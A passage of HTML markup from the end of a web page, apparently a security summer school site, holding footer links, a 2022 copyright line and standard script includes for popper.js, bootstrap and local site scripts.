class="fab fa-youtube"></i></a></li></ul></div><div class="col-6 col-sm-4 text-right text-xs-center order-sm-3"><ul class="list-inline mb-0"><li class="list-inline-item mx-2 h3" data-toggle=tooltip data-placement=top title=GitHub aria-label=GitHub><a class=text-white target=_blank rel=noopener href=https://github.com/security-summer-school aria-label=GitHub><i class="fab fa-github"></i></a></li></ul></div><div class="col-12 col-sm-4 text-center py-2 order-sm-2"><small class=text-white>&copy; 2022 Open-Source Contributors. All Rights Reserved</small></div></div></div></footer></div><script src=https://cdn.jsdelivr.net/npm/popper.js@1.16.1/dist/umd/popper.min.js integrity=sha384-9/reFTGAW83EW2RDu2S0VKaIzap3H66lZH81PoYlFhbGU+6BZp6G7niu735Sk7lN crossorigin=anonymous></script><script src=https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/js/bootstrap.min.js integrity=sha384-+YQ4JLhjyBLPDQt//I+STsc9iw4uQqACwlvpslubQzn4u2UU2UFM80nGisd026JF crossorigin=anonymous></script><script src=/js/tabpane-persist.js></script><script src=/js/main.min.5c74b870c6953931a705f390a49c7e4c0a842ec5c83b24354758dd674343ed0d.js integrity="sha256-XHS4cMaVOTGnBfOQpJx+TAqELsXIOyQ1R1jdZ0ND7Q0=" crossorigin=anonymous></script></body></html>